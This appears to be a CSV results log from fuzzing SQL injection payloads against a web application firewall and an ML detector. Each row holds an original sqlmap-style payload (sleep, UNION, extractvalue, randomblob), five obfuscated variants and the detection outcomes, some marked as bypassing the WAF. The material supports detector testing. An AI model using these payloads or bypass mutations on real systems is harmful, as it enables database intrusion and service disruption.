Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5
21,2024-12-16T16:53:48.771990,1 where 6304  =  6304,403,200,403,waf_incorrect_ml_correct, and 0x1	WherE ' )'=' )'   Like  /**/6304,2024-12-16T16:53:49.874275,200,200,both_incorrect, AND 0x1	WHEre ' )' LIKE '	)'   LikE   0x18a0,2024-12-16T16:53:52.865426,200,403,waf_incorrect_ml_correct, && 0x1	whErE ' )' like/*s$*/' )'   lIke   0x18a0,2024-12-16T16:53:56.105589,200,200,both_incorrect,"  and  0x1
WheRE ' )' liKE ' )'   like   0x18a0",2024-12-16T16:53:59.445078,200,200,both_incorrect,  anD/*]<*/ 0x1	WhErE ' )' like ' )'   lIKE   0x18a0,2024-12-16T16:54:02.741434,200,200,both_incorrect
22,2024-12-16T16:54:06.179722,nhat,200,200,200,both_correct,nhat,2024-12-16T16:54:06.492459,200,200,both_correct,nhat,2024-12-16T16:54:07.828440,200,200,both_correct,nhat,2024-12-16T16:54:09.157330,200,200,both_correct,nhat,2024-12-16T16:54:10.506980,200,200,both_correct,nhat,2024-12-16T16:54:11.823194,200,200,both_correct
23,2024-12-16T16:54:13.145338,witney,200,200,200,both_correct,witney,2024-12-16T16:54:13.576217,200,200,both_correct,witney,2024-12-16T16:54:14.985585,200,200,both_correct,witney,2024-12-16T16:54:16.408171,200,200,both_correct,witney,2024-12-16T16:54:17.835100,200,200,both_correct,witney,2024-12-16T16:54:19.257728,200,200,both_correct
24,2024-12-16T16:54:20.819665,6.81924E+15,200,200,200,both_correct,(SELECt/**/ Or '--S'<>'--Ss').81924E+15,2024-12-16T16:54:21.544160,403,403,both_incorrect,(SELECT 	oR '--S'!='--Ss').81924E+';' LikE ';',2024-12-16T16:54:24.626810,403,403,both_incorrect,"(selEct
	oR '--S'/**/not like '--Ss').81924E+';' lIKe ';'",2024-12-16T16:54:27.896654,403,403,both_incorrect,"(SElEcT
 or '--S' not like '--Ss').81924E+';' LIkE ';'",2024-12-16T16:54:31.638985,403,403,both_incorrect,(selECT  or '--S' not like '--Ss').81924E+';'/*K}$|*/likE ';',2024-12-16T16:54:35.391818,403,200,waf_incorrect_ml_correct
25,2024-12-16T16:54:39.424114,"1 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",403,403,200,waf_correct_ml_incorrect,"(SELECT 1) Or/**/(SELECT 1845!=1846)   like     (  selEcT count  (  * 	)   fROm rdb$fields as t1,rdb$types aS t2,rdb$collations As t3,rdb$functions aS t4  )  --",2024-12-16T16:54:45.524074,403,200,waf_correct_ml_incorrect,"(sELeCt 3549<>3550) oR/**/(sElecT (seLECt (SELECT 1)) not like 1846) /**/ LIke     (  selEcT count  (  * 
)   FROM rdb$fields aS t1,rdb$types as t2,rdb$collations as t3,rdb$functions As t4  )  --",2024-12-16T16:54:54.298049,403,200,waf_correct_ml_incorrect,"(SEleCt '	'!='	%'!=3550) oR/**/(sELeCT (SeLect (sElEcT 0x1)) not like (seLeCt 1)) /**/ LIKE     (  seLecT count  (  *  )   From rdb$fields aS t1,rdb$types AS t2,rdb$collations/**/aS t3,rdb$functions AS t4  )  --",2024-12-16T16:55:04.496926,403,200,waf_correct_ml_incorrect,"(SeLect ' '!='	%'<>0xdde) Or (sELEcT (sEleCt (seleCt 0x1)) not like (sElECt 3335 In ( AND 1,3335,3336))) /**/ LIKe     (  SElect count  (  *  )   frOm rdb$fields as t1,rdb$types As t2,rdb$collations/**/AS t3,rdb$functions aS t4  )  --",2024-12-16T16:55:15.582959,403,200,waf_correct_ml_incorrect,"(sELect ' ' NOT LIKE '
%'<>0xdde) or (sElEct (sELeCT (seleCt 0x1)) not like (SeleCt  or 0x0 in ( aNd 1,3335,'V' NOT LIKE 'VT')))   LIke     (  SElEcT count  (  *  )   fRom rdb$fields As t1,rdb$types As t2,rdb$collations/**/as t3,rdb$functions AS t4  )  --",2024-12-16T16:55:27.758011,403,200,waf_correct_ml_incorrect
26,2024-12-16T16:55:40.972048,66718383y,200,200,200,both_correct,66718383y,2024-12-16T16:55:41.546126,200,200,both_correct,66718383y,2024-12-16T16:55:43.097990,200,200,both_correct,66718383y,2024-12-16T16:55:44.644251,200,200,both_correct,66718383y,2024-12-16T16:55:46.193613,200,200,both_correct,66718383y,2024-12-16T16:55:47.742745,200,200,both_correct
27,2024-12-16T16:55:49.282413,"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",403,403,403,both_correct,"-1894'/*&u*/ )   union all selEcT	8123, aND 1,8123,8123,8123,8123,8123,4572<>4573,(SELECT 8123)#",2024-12-16T16:55:52.873297,403,403,both_correct,"-59 lIkE 59'/*&u*/ )   union
all SelEct	8123,/**/aND 1,8123,8123,8123,8123,8123, AND 1<>4573,(seleCT 0x1fbb)#r",2024-12-16T16:55:58.513955,403,403,both_correct,"-59 liKe 59' 
)   union
all SELect	 OR 4233 NOT LIKE 4234,/**/And 1,8123,8123,8123,8123,8123, AnD 1!=(SELECT 4573),(selEct 0x1fbb)#r)~",2024-12-16T16:56:04.775029,403,403,both_correct,"-59 Like 59' 
)   union
all SELect
 ||  AND/**/1 NOT LIKE 4234,/**/And 1,8123,8123,8123,8123,8123, AnD '<y'!='<yg'!=(SEleCT (SELECT 4573)),(sElect 0x1fbb)#r)~d_",2024-12-16T16:56:12.365236,403,403,both_correct,"-59 Like 'gK'w' LIKE 'gK'w'' 
)/**/  union
all SELect
 ||  AND/**/1 NOT LIKE 4234,/**/And 1,(SELECT 8123),8123,8123,(SELECT 1),8123, AnD '<y'!='<yg' NOT LIKE (sElECt (selECT	4573)),(seLect 0x1fbb)#r)~d_K",2024-12-16T16:56:21.024019,403,403,both_correct
28,2024-12-16T16:56:31.554976,8888,200,200,200,both_correct, AnD 1	LIkE 0x742,2024-12-16T16:56:31.889421,200,200,both_correct," AnD
(selECT 0x1)	LIke/*(Mr{p*/0x742",2024-12-16T16:56:33.789649,403,200,waf_incorrect_ml_correct,"	ANd
(Select/**/0x1)	LIKE/*(Mr{p*/0x742",2024-12-16T16:56:36.552929,403,200,waf_incorrect_ml_correct,	And	(sELEct 0x1)	liKe/*(Mr{p*/0x742,2024-12-16T16:56:39.534049,200,200,both_correct,"	&&	(SelecT
0x1)	likE/*(Mr{p*/0x742",2024-12-16T16:56:42.740406,403,200,waf_incorrect_ml_correct
29,2024-12-16T16:56:45.678016,1%' and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and '%'  =  ',403,403,200,waf_correct_ml_incorrect,(SElEcT 1)%' and 'X('!='X(7'  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113 	)  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  0x7a  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   ) /**/  )     )   from dual  )   and '%'  =  ',2024-12-16T16:57:05.486185,403,200,waf_correct_ml_incorrect,(selECT '\AXO'<>'\AXOY')%' and 'X('!='X(7'  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )/**/ ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else (SELECT 1) end  )   from dual  )  ||chr  (  113  )  ||chr  (  0x7a  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  0x71  )  ||chr  (  62   ) /*[k*/  )     )   from dual  )   and '%'  =  ',2024-12-16T16:57:26.447913,403,200,waf_correct_ml_incorrect,"(sElECt '\AXO' not like '\AXOY')%' and 'X('!='X(7'  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  '_'='_'  )  ||chr  (  113  )  ||chr  (  0x70  )  ||chr  (  106  )/*>H|*/ ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else (SELECT 1) end  )   from dual  ) /**/||chr  (   OR 0  )  ||chr  (  0x7a  )
 ||chr  (  118  )  ||chr  (  122  )  ||chr  (  0x71  )  ||chr  (  62   ) /**/  )     )   from dual  )   and '%'  =  '",2024-12-16T16:57:49.375981,403,200,waf_correct_ml_incorrect,(seLECT '\AXO' not like '\AXOY')%' and 'X('!='X(7'  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  '_'='_'  )  ||chr  (  113  )  ||chr  (  0x70  )  ||chr  (  106  )/*>H|*/ ||chr  (  113  )  ||  (  select   (  case when   (  0xeaa  =  3754  )   then 1 else (SELECT 1) end  )   from dual  ) /*>*/||chr  (/**/  OR 0  )  ||chr  (  0x7a  )	 ||chr  (   AND 1<>780  )  ||chr  (  122  )  ||chr  (  0x71  )  ||chr  (  62   ) /**/  )     )   from dual  )   and '%'  =  ',2024-12-16T16:58:12.957281,403,200,waf_correct_ml_incorrect,"(sELect '\AXO' not like '\AXOY')%' and 'X('!='X(7'  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  '_'='_'  )  ||chr  (  113  )  ||chr  (  0x70  )  ||chr  (  0x6a  )/*>H|*/ ||chr  (  113  )  ||  (  select   (  case when   (  0xeaa  =  3754  )   then 1 else (SELECT 7411 NOT LIKE 7412) end  )   from dual  ) /*>*/||chr  (/**/  OR 0  )  ||chr  (/**/ 0x7a  )	 ||chr  ( 
 AND 1<>(SELECT 1)  )  ||chr  (  122  )  ||chr  (  0x71  )  ||chr  (  62   ) /**/  )     )   from dual  )   and '%'  =  '",2024-12-16T16:58:37.128122,403,200,waf_correct_ml_incorrect
30,2024-12-16T16:59:02.474425,97649797p,200,200,200,both_correct,97649797p,2024-12-16T16:59:03.059342,200,200,both_correct,97649797p,2024-12-16T16:59:04.613225,200,200,both_correct,97649797p,2024-12-16T16:59:06.305604,200,200,both_correct,97649797p,2024-12-16T16:59:07.908384,200,200,both_correct,97649797p,2024-12-16T16:59:09.497339,200,200,both_correct
31,2024-12-16T16:59:11.069164,"1 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  # hlrg",403,403,200,waf_correct_ml_incorrect,"(SelEct 1) and (seleCt 512!=513) /**/ Like     (  SELEcT count  (
 *  )   From rdb$fields As t1,rdb$types As t2,rdb$collations AS t3,rdb$functions As t4  )  # hlrg",2024-12-16T16:59:17.415811,403,200,waf_correct_ml_incorrect,"(selEcT  aND 1) And (select 'a'='a'<>0x201) /*e*'p}*/ lIkE     (  SELEct count  (	 *  )   from rdb$fields as t1,rdb$types AS t2,rdb$collations/**/aS t3,rdb$functions as t4  )  # hlrg",2024-12-16T16:59:26.092559,403,200,waf_correct_ml_incorrect,"(SeLecT /**/and (SELECT (SELECT 7728 NOT LIKE 7729))) aNd (selECT 'a' like 'a'<>0x201) /*e*'p}*/ lIkE     (  SELeCT count  (
 *  )   FROM rdb$fields aS t1,rdb$types as t2,rdb$collations/**/as t3,rdb$functions as t4  )  # hlrgIp",2024-12-16T16:59:35.898307,403,403,both_correct,"(SEleCT /**/aND (sElecT (SelEcT (SELECT 7728) NOT LIKE  oR 379 LIKE 379))) anD (sELECT 'a' LiKe 'a'!=0x201) /*e*'p}*/ lIkE     (  SELect count  (  *  )   FRoM rdb$fields aS t1,rdb$types as t2,rdb$collations/*x[8*/As t3,rdb$functions AS t4  ) /**/# hlrgIp",2024-12-16T16:59:47.495461,403,200,waf_correct_ml_incorrect,"(SElecT /*MV*/anD (seLect (sELECt (SELecT 7728) NOT LIKE  or 379 lIkE 8078 LIKE  AND 0x1))) AnD (sELECt 'a' LiKe 'a' NOT LIKE 0x201) /*e*'p}*/ liKE     (  sELecT count  (  *  )   FROM rdb$fields aS/**/t1,rdb$types	As t2,rdb$collations/*x[8*/as t3,rdb$functions as t4  ) /**/# hlrgIp",2024-12-16T17:00:00.647904,403,200,waf_correct_ml_incorrect
32,2024-12-16T17:00:15.512354,1'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   'tjvy' like 'tjvy,403,403,403,both_correct,"1'   )    )    and   (  select * from   (  select  (  sleep  (   OR 9570=(SELECT 9570)   )    )     )  fzno  )   and /**/  (    (   'tjvy'
like 'tjvy",2024-12-16T17:00:21.546496,403,403,both_correct,(SELECT 3943) lIKE 3943'   )    )    and   (  select * from   (  select  (  sleep  (   OR  AND 1=(SELECT 9570)   )    )     )  fzno  ) /**/ and /*y0_X3*/  (    (   'tjvy' like 'tjvy,2024-12-16T17:00:30.365253,403,403,both_correct,(SELECt (SELeCT '{'!='{g')) LikE  and 1'   )    )    and   (  select * from  	(/**/ select  (  sleep  (   OR  AND 1=(SELECT 9570)   )    )     )  fzno  ) /**/ and /*y0_X3*/  (    (   'tjvy' like 'tjvy,2024-12-16T17:00:40.057347,403,403,both_correct,"(seLEcT (sELeCt '{' not like '{g')) like
 aND 0x1'   )  /**/ )    and   (  select * from  	(/**/ select  (  sleep  (   OR  AND 9640=9640=(SELECT (SELECT 1))   )    )     )  fzno  ) /**/ and /**/  (    (   'tjvy' like 'tjvy",2024-12-16T17:00:50.707450,403,403,both_correct,"(sELEcT (SeleCT '{' not like '{g')) liKE
 AnD 0x1'   )  /*H\,$g*/ )   	and   (  select * from  	(/**/ select  (  sleep  (   OR  AND 'T
'='T
'=9640=(SELECT (SELECT  OR (SELECT 0)))   )    )     )  fzno  )   and /**/  (    (   'tjvy' like 'tjvy",2024-12-16T17:01:02.103352,403,403,both_correct
33,2024-12-16T17:01:14.440389,"1%'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  '%'  =  '",403,403,200,waf_correct_ml_incorrect,"9123 IN (9122,9123,9124)%'  )/**/  or  OR (SELECT 0)  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as
t3  )   and   (  '%'  =  '",2024-12-16T17:01:21.633780,200,403,waf_incorrect_ml_correct," or 0!=5857 iN (9122,(SELECT 9123),9124)%'  )   or  OR (SELECT 0)  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables
as
t3  )   and   (  '%'  =  '",2024-12-16T17:01:31.213919,403,403,both_correct," or (selecT 0) NOT LIKE 5857 IN ((SelEct 3368!=3369),(sElect 9123),9124)%'  )   or  OR (SELECT 0)	 =    (  select count  (  *  ) /**/ from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables
as
t3  )   and   (  '%'  =  '",2024-12-16T17:01:41.629736,200,403,waf_incorrect_ml_correct,"
oR (seleCT ';]'=';]') NOT LIKE 5857 IN ((sELECT/**/3368 NOT LIKE 3369),(sELEcT (SeLEcT (SeleCT 1))),9124)%'  )   or  OR (SELECT 0)	 =    (  select count  (  *  ) /**/ from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables
as
t3  )   and   (  '%'  =  '",2024-12-16T17:01:53.430865,200,403,waf_incorrect_ml_correct,"
OR (SElecT ';]' LIKE ';]') NOT LIKE 0x11ba LIKE 4538 In ((SELEcT/**/3368 NOT LIKE 3369),(SElEcT (SelecT (SElect 1))),(SELECT 1))%'  )   or  OR (SELECT 0)	 =    (  select count  (  *  ) /*6U^q*//**/from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables
as t3  )   and   (  '%'  =  '",2024-12-16T17:02:07.214622,200,403,waf_incorrect_ml_correct
34,2024-12-16T17:02:21.928078,"1 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  ",403,403,200,waf_correct_ml_incorrect,"0x1 procedure/*=*/analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  SElect   (  cAse wHen   (  5840   lIKE   5840  )   tHEN 'P
'<>'P	J' ELSE  and 1 enD   )    )   ,0x717a767a71   )    )   ,1  )  ",2024-12-16T17:02:30.817579,403,200,waf_correct_ml_incorrect,"0x1 procedure/*=*/analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  selEcT   (  CASe WHeN   (  (SELECT 1)   lIKE   5840  )  /**/ThEn 'P ' NOT LIKE 'P	J' elsE  AnD 1 END   )    )   ,0x717a767a71   )    )   ,'~9'='~0x9'  )  ",2024-12-16T17:02:41.738610,403,200,waf_correct_ml_incorrect,"0x1 procedure/*=*/analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  seLECt   (  cASE wHEn   (  (seleCT 1)   LIKE   0x16d0  )  /**/tHen 'P ' not like 'P J' ELSe  aND  AND 8294<>8295 END   )    )   ,0x717a767a71  /**/)    )   ,'~9'='~0x9'  )  ",2024-12-16T17:02:54.195308,403,200,waf_correct_ml_incorrect,"0x1 procedure/**/analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  SElECT   (  caSE whEn   (  (sElect 1)   lIkE   0x16d0  )  /**/then 'P ' not like 'P J' elsE  ANd  aND 8294 not like '`' NOT LIKE '`A' ENd   )	   )   ,0x717a767a71  /**/)    )   ,'~(SELECT (SELECT 1))'='~0x9' /**/)  ",2024-12-16T17:03:07.362031,403,403,both_correct,"0x1 procedure/**/analyse  (  extractvalue /**/(  5840,concat  (  0x5c,0x7171706a71,  (  seLECT   (  CasE wheN   (  (sElEcT 1)   LiKe   0x16d0  )  /**/tHen 'P ' not like 'P J' ELSe  AnD  and  OR '~' LIKE '~' not like '`' NOT LIKE '`A' eNd   )
   )   ,0x717a767a71  /*b*/)    )   ,'~(SELECT (SELECT 0x1))' lIKe '~0x9' /**/)  ",2024-12-16T17:03:22.496418,403,403,both_correct
35,2024-12-16T17:03:38.676289,"1' and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and 'tmwy'  =  'tmwy",403,403,403,both_correct,"1' and   (  select 2*  (  if   (    (   select * from   ( /*T*/select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 
AND (SELECT 'a' NOT LIKE 'aw')   )    )     )   and 'tmwy'  =  'tmwy",2024-12-16T17:03:51.336442,403,403,both_correct,"1' and   (  select 527 LIKE 0x20f*  (  if   ( /**/  (   select * from   ( /**/select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  (SELECT 1),1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610,  AND (SELECT 'a' NOT LIKE 'aw')   )    )     )   and 'tmwy'  =  'tmwy",2024-12-16T17:04:05.404789,403,403,both_correct,"1' and   (  select 527 LIKE 0x20f*  (  if   (    (   select * from   ( /*<Rr!F*/select concat  (  0x7171706a71,  (  select   (  elt  (  3029 IN (0xbd4,(SELECT 1),3030)  =  (SELECT 1),1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610,  AND (SELECT 'a' NOT LIKE 'aw')   )    )     )   and 'tmwy'  =
 'tmwy",2024-12-16T17:04:20.693409,403,403,both_correct,"4344 LIKE  aNd 1' and   (  select (SELECT 527) LIKE 0x20f*  (  if   (    (   select * from   ( /*<Rr!F*/select concat  ( /**/0x7171706a71,  (  select   (  elt  (  3029 IN (0xbd4,(SELECT 1),3030)  =  (SELECT 1),1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610,  AND (SELECT 'a' NOT LIKE 'aw')   )    )     )   and 'tmwy'  =	 'tmwy",2024-12-16T17:04:37.459469,403,403,both_correct," AND 0x1 LiKe  aND 1' and   (  select (SELECT 527) LIKE 0x20f*  (  if   (    (   select * from  
( /*3.[LK*/select concat  (  0x7171706a71,  (  select   (  elt  (  3029 IN (0xbd4,(SELECT 1),4923=4923)  =  (SELECT 1),1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610,  AND (SELECT 'a' NOT LIKE 'aw')   )    )     )   and 'tmwy'  =	 'tmwy",2024-12-16T17:04:55.296806,403,403,both_correct
36,2024-12-16T17:05:13.127579,"1  )   where 6374  =  6374 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",403,403,403,both_correct,"1  )   wHeRE 6374  =  6374 oR row  (  1045,(sElecT 7562)  )  >  (  sELEct count  (  *  )  ,concat  (  0x7171706a71,  (  SEleCt   (  elt  (  (SELECT 'z'!='zf')   LIke   1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x FROm /*.?18*/ ( 	sELeCT 8488 union SElEct 5584 union seleCT 3051 union SElEcT 1210  )  a group by x  )  --",2024-12-16T17:05:28.220562,403,200,waf_correct_ml_incorrect,"1  )   WHerE 6374  = 
6374 Or row  (  1045,(SelEct (SELeCt 1))  )  >  (  sELeCT count  (  *  )  ,concat  (  0x7171706a71,  (  selEcT   (  elt  (  (SEleCT 'z'!='zf')  /**/like   9895 NOT LIKE 9896,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0x0  )  *2   )    )   x From /*.?18*/ ( 	SeleCT 8488 union SElECT 5584 union sElect 3051 union SElEct 1210  )  a group by x  )  --",2024-12-16T17:05:45.875113,403,200,waf_correct_ml_incorrect,"(SeleCT 1)  )   Where 6374   LIKe  	1476!=1477 or row  ( /**/1045,(sELeCT (seleCT 1))  )  >  (  seleCT count  (  *  )  ,concat  (  0x7171706a71,  (  seLeCT   (  elt  (  (seLeCT 'z'!='zf')  /*;FeSn*/Like   9895 NOT LIKE 9896,(seLeCT 1)   )    )     )  ,0x717a767a71,floor  (  rand  (  0x0  )  *2   )    )   x frOm /**/ ( 	sElect 8488 union sELEcT 5584 union SEleCt 3051 union SelECt 1210  )  a group by x  )  --",2024-12-16T17:06:04.591894,403,200,waf_correct_ml_incorrect,"(SElECT 1)  )   WheRe 6374   lIke   1476<>1477 OR row  ( /**/1045,(sELecT (sELEct (SELECT 1)))  )  >  (  SELeCT count  (  *  )  ,concat  (  0x7171706a71,  (  SelEcT   (  elt  (  (SELEcT 'z'!='zf')  /*;FeSn*/LiKe   9895 NOT LIKE 9896,(SELECT (sELecT 1))   )    )     )  ,0x717a767a71,floor/**/ (  rand  (  0x0  )  *2   )    )   x fROm /**/ ( 	seLECT 8488 union SeLect 5584 union SelECt 3051 union SelEcT '@q'<>'@qi'  )  a group by x  )  --",2024-12-16T17:06:25.089286,403,403,both_correct,"(selECt (SELECT 1))  )   WheRE (SELECT 6374)   lIke   1476<>1477 Or row  ( /*]D S*/1045,(SeLECT (sELeCT (SelECT 1)))  )  >  (  SELEcT count  (  *  )  ,concat  (  0x7171706a71,  (  SelECT   (  elt  (  (sElecT 'z'<>'zf')  /*;FeSn*/lIKE   9895 NOT LIKE 9896,(seLEct (SelECT 1))   )    )     )  ,0x717a767a71,floor/**/ (  rand  (  0x0  )  *2   )    )   x FRoM   ( 
sElecT 8488 union select 3652=3652 union SelECt 3051 union SELEct '@q'<>'@qi'  )  a group by x  )  --",2024-12-16T17:06:46.832646,403,403,both_correct
37,2024-12-16T17:07:11.159154,plaza tilos s/n,200,200,200,both_correct,plaza/**/tilos	s/n,2024-12-16T17:07:12.035271,200,200,both_correct,"plaza/*&ENF*/tilos
s/n",2024-12-16T17:07:13.974141,200,200,both_correct,plaza/*t-**/tilos	s/n,2024-12-16T17:07:16.197864,200,200,both_correct,"plaza/*t-**/tilos
s/n",2024-12-16T17:07:18.311054,200,200,both_correct,plaza/*t-**/tilos	s/n,2024-12-16T17:07:20.469287,200,200,both_correct
38,2024-12-16T17:07:22.616254,"1  )   where 1513  =  1513 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",403,403,200,waf_correct_ml_incorrect," AND 1  ) 
 wHERE (SELECT 1513)  =  '>Hc~'!='>Hc~J' aNd 8148   like   LiKE  (  'abcdefg',upper  (  hex  (  randomblob /**/(  500000000/2   )    )      )    )   --",2024-12-16T17:07:29.116359,200,200,both_incorrect," anD 1  ) 	 WHerE (seLeCT 1513)  =  '>Hc~'!='>Hc~J' and 0x1fd4   lIKE   LIKe  (  'abcdefg',upper  (/**/ hex  (  randomblob /**/(  ';jh' lIKe ';jh'/(SELECT 1)   )    )      )    )   --",2024-12-16T17:07:37.636565,200,200,both_incorrect," and 1  ) 	 whERE (SElECT (SELECT 1513))   LIkE   '>Hc~'!='>Hc~J'
ANd 0x1fd4   likE   likE  (  'abcdefg',upper  (/**/ hex /**/(  randomblob /**/(  ';jh' lIke ';jh'/(sElect (SeleCT '}[' LIKE '}['))   )    )      )    )   --",2024-12-16T17:07:47.329571,200,200,both_incorrect," And 1  ) 
 WHeRE (sELEct (seLeCt (SElect 1) NOT LIKE 0x6de))   LiKE   '>Hc~' not like '>Hc~J'
and 0x1fd4   likE   liKe  (  'abcdefg',upper  (/**/ hex /**/(  randomblob /**/(  ';jh' LIKe ';jh'/(SEleCT (SelecT '}[' liKE '}['))   )/**/   )      )    )   --",2024-12-16T17:07:58.990066,200,200,both_incorrect," and (SELECT 3194) NOT LIKE  and 1  ) 
 WHErE (SelECt (sELEcT (sElECT 1) NOT LIKE 0x6de))   like   '>Hc~' not like '>Hc~J'
anD 0x1fd4   likE   lIKe  (  'abcdefg',upper  (/**/ hex  (  randomblob /**/(  ';jh' LIKE ';jh'/(SElEct (SElecT '}[' LIKe '}['))   )/**/ 	 )      )    )   --",2024-12-16T17:08:11.896976,200,403,waf_incorrect_ml_correct
39,2024-12-16T17:08:26.218974,9124,200,200,403,waf_correct_ml_incorrect,"(SeLEct
'^=#0x1' not like '^=#1$')",2024-12-16T17:08:26.538532,403,403,both_incorrect,(seleCT	'^=#0x1' not like/*l*/'^=# AND '' NOT LIKE 'U'$'),2024-12-16T17:08:29.215250,403,403,both_incorrect,"(SeleCt
'^=#0x1' not like/**/'^=# AND ''/**/NOT LIKE 'U'$')B]",2024-12-16T17:08:33.128642,403,200,waf_incorrect_ml_correct,"(SeLeCt
'^=#0x1' not like/**/'^=#/**/AND ''/**/NOT
LIKE 'U'$')B]Rq",2024-12-16T17:08:37.116717,403,200,waf_incorrect_ml_correct,"(SElECt
'^=#0x1' not
like/*cj*/'^=#/**/AND/**/''/**/NOT
LIKE 'U'$')B]Rq",2024-12-16T17:08:41.428764,403,200,waf_incorrect_ml_correct
